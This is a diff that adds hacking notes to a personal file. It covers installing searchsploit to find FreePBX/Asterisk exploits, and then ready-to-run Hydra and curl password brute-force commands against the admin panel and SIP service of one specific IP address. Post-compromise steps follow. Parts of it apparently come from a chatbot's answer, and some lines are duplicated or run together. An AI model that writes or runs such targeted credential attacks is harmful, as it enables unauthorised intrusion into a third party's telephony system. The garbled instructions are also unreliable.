@@ -14850,3 +14850,97 @@ get.activated.win
 └──╼[ZERODIUM]#ls /usr/share/wordlists/
 updatedb
 
+##Installing exploitdb or searchsploit on debian systems
+<BS> Clone the ExploitDB Repository
+bash
+git clone https://gitlab.com/exploit-database/exploitdb.git /opt/exploitdb Clone the ExploitDB Repository
+bash
+git clone https://gitlab.com/exploit-database/exploitdb.git /opt/exploitdb
+3. Add searchsploit to Your PATH
+Create a symbolic link to make searchsploit globally accessible:
+bash
+ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit
+4. Update the Exploit Database
+bash
+searchsploit -u
+
+5. Verify Installation
+Check if it works:
+bash
+searchsploit --help
+
+6. Search for FreePBX/Asterisk Exploits
+Now search for your target:
+bash
+searchsploit freepbx 16.0.40
+searchsploit asterisk 20.12.0
+
+Troubleshooting
+If you get command not found, ensure /usr/local/bin is in your PATH:
+bash
+echo $PATH
+
+If missing, add it:
+bash
+export PATH=$PATH:/usr/local/bin
+
+(Add this line to ~/.bashrc for persistence.)
+
+Let me know if you encounter issues!
+
+##cracking password with hydra
+ Run Hydra with Targeted Wordlists
+Command Template:
+bash
+hydra -l admin -P <WORDLIST> -t 16 -w 5 -f 41.139.203.91 https-post-form 
+
+"/admin/config.php:username=^USER^&password=^PASS^:Invalid"
+
+Examples:
+Top 1,000 Passwords (Fastest):
+bash
+hydra -l admin -P "$TOP_1000" -t 16 -w 5 -f 41.139.203.91 https-post-form 
+
+"/admin/config.php:username=^USER^&password=^PASS^:Invalid"
+
+Top 20,000 Passwords (Balanced Speed/Coverage):
+bash
+hydra -l admin -P "$TOP_20K" -t 16 -w 5 -f 41.139.203.91 https-post-form 
+
+"/admin/config.php:username=^USER^&password=^PASS^:Invalid"
+
+Default PBX Credentials (If available):
+bash
+hydra -l admin -P "$DEFAULT_PBX" -t 16 -w 5 -f 41.139.203.91 https-post-form 
+
+"/admin/config.php:username=^USER^&password=^PASS^:Invalid"
+
+3. Key Optimizations
+-t 16: 16 parallel tasks (adjust if the server throttles).
+-w 5: 5-second delay between attempts to avoid lockouts.
+-f: Stop after first valid login.
+Verify the "Invalid" string: If the failure message differs (e.g., "Login failed"), update the command.
+4. If All Wordlists Fail
+Try Common PBX Defaults Manually:
+bash
+for pass in "admin" "password" "1234" "asterisk" "freepbx" "pbxadmin"; do
+curl -X POST -d "username=admin&password=$pass" 
+
+"https://41.139.203.91/admin/config.php" -k -v | grep -i "invalid" || echo "Possible success: $pass"
+done
+
+5. Post-Brute-Force Steps
+If you get credentials:
+
+Check for Privilege Escalation:
+Look for misconfigured admin functions (e.g., file uploads, command injection).
+Review Asterisk CLI:
+If you have SIP credentials, connect to Asterisk CLI via SSH (if exposed): bash ssh admin@41.139.203.91 -p 22 # Common default port
+6. Fallback: SIP Brute-Force (Port 5061)
+If the web panel is locked down, target SIP:
+bash
+hydra -L users.txt -P "$TOP_1000" -s 5061 41.139.203.91 sip
+
+(Replace users.txt with common SIP extensions like 1000,1001,1002.)
+
+
